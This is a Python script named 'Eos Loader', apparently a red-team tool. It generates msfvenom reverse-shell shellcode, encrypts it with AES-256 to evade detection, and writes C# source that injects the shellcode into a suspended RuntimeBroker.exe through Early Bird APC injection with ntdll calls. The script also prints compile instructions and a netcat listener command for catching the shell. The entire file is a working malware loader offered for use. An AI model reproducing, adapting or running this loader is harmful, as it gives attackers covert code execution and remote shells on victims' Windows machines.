#!/usr/bin/env python3
import subprocess
import sys
import argparse
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend

def parse_args():
    parser = argparse.ArgumentParser(description="Eos Loader - Early Bird APC Injection Generator")
    parser.add_argument("--lhost", required=True, help="Listener IP address")
    parser.add_argument("--lport", required=True, type=int, help="Listener port")
    parser.add_argument("--payload", default="windows/x64/shell_reverse_tcp", help="msfvenom payload (default: windows/x64/shell_reverse_tcp)")
    parser.add_argument("--target", default="C:\\\\Windows\\\\System32\\\\RuntimeBroker.exe", help="Sacrificial process path (default: RuntimeBroker.exe)")
    parser.add_argument("--out", default="eos.cs", help="Output C# filename (default: eos.cs)")
    return parser.parse_args()

def generate_raw_shellcode(payload, lhost, lport):
    cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", "raw", "-o", "/dev/stdout"]
    try:
        result = subprocess.run(cmd, capture_output=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        print(f"[!] msfvenom failed: {e.stderr.decode()}", file=sys.stderr)
        sys.exit(1)

def aes_encrypt(data):
    key = os.urandom(32)
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    pad = 16 - (len(data) % 16)
    data += bytes([pad]) * pad
    return key, iv, encryptor.update(data) + encryptor.finalize()

def fmt_cs_bytes(data):
    return "{" + ", ".join(f"0x{b:02x}" for b in data) + "}"

def generate_csharp(key, iv, encrypted_shellcode, target_process):
    return f'''using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;

namespace EarlyBirdInjector
{{
    class Program
    {{
        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {{
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }}

        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {{
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }}

        public const uint CREATE_SUSPENDED = 0x00000004;
        public const uint MEM_COMMIT       = 0x1000;
        public const uint MEM_RESERVE      = 0x2000;
        public const uint PAGE_READWRITE   = 0x04;
        public const uint PAGE_EXECUTE_READ = 0x20;

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", SetLastError = false)]
        public static extern int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);

        [DllImport("ntdll.dll", SetLastError = false)]
        public static extern int NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, IntPtr BufferSize, ref IntPtr NumberOfBytesWritten);

        [DllImport("ntdll.dll", SetLastError = false)]
        public static extern int NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);

        [DllImport("ntdll.dll", SetLastError = false)]
        public static extern int NtQueueApcThread(IntPtr ThreadHandle, IntPtr ApcRoutine, IntPtr ApcArgument1, IntPtr ApcArgument2, IntPtr ApcArgument3);

        [DllImport("ntdll.dll", SetLastError = false)]
        public static extern int NtResumeThread(IntPtr ThreadHandle, out uint SuspendCount);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool CloseHandle(IntPtr hObject);

        static byte[] DecryptAes(byte[] data, byte[] key, byte[] iv)
        {{
            using (Aes aes = Aes.Create())
            {{
                aes.Key = key;
                aes.IV = iv;
                aes.Mode = CipherMode.CBC;
                aes.Padding = PaddingMode.PKCS7;
                using (MemoryStream ms = new MemoryStream())
                using (CryptoStream cs = new CryptoStream(ms, aes.CreateDecryptor(), CryptoStreamMode.Write))
                {{
                    cs.Write(data, 0, data.Length);
                    cs.FlushFinalBlock();
                    return ms.ToArray();
                }}
            }}
        }}

        static void Main()
        {{
            byte[] encrypted = {fmt_cs_bytes(encrypted_shellcode)};
            byte[] key       = {fmt_cs_bytes(key)};
            byte[] iv        = {fmt_cs_bytes(iv)};
            byte[] buf       = DecryptAes(encrypted, key, iv);

            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(si);
            PROCESS_INFORMATION pi;

            if (!CreateProcess(null, "{target_process}", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi))
                return;

            IntPtr baseAddr   = IntPtr.Zero;
            IntPtr regionSize = (IntPtr)buf.Length;
            NtAllocateVirtualMemory(pi.hProcess, ref baseAddr, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

            IntPtr bytesWritten = IntPtr.Zero;
            NtWriteVirtualMemory(pi.hProcess, baseAddr, buf, (IntPtr)buf.Length, ref bytesWritten);

            uint oldProtect;
            IntPtr tempAddr = baseAddr;
            IntPtr tempSize = regionSize;
            NtProtectVirtualMemory(pi.hProcess, ref tempAddr, ref tempSize, PAGE_EXECUTE_READ, out oldProtect);

            NtQueueApcThread(pi.hThread, baseAddr, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);

            uint suspendCount;
            NtResumeThread(pi.hThread, out suspendCount);

            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }}
    }}
}}
'''

if __name__ == "__main__":
    args = parse_args()

    print(f"[*] Payload  : {args.payload}")
    print(f"[*] LHOST    : {args.lhost}")
    print(f"[*] LPORT    : {args.lport}")
    print(f"[*] Target   : {args.target}")
    print(f"[*] Output   : {args.out}")
    print()

    raw = generate_raw_shellcode(args.payload, args.lhost, args.lport)
    print(f"[+] Shellcode : {len(raw)} bytes")

    key, iv, enc = aes_encrypt(raw)
    print(f"[+] Encrypted : {len(enc)} bytes (AES-256-CBC)")

    code = generate_csharp(key, iv, enc, args.target)
    with open(args.out, "w") as f:
        f.write(code)
    print(f"[+] C# source written to {args.out}")
    print()
    print("[*] Compile (x64, Windows):")
    print(f"    C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /platform:x64 /unsafe /out:eos.exe {args.out}")
    print("[*] Start listener:")
    print(f"    sudo nc -lvnp {args.lport}")
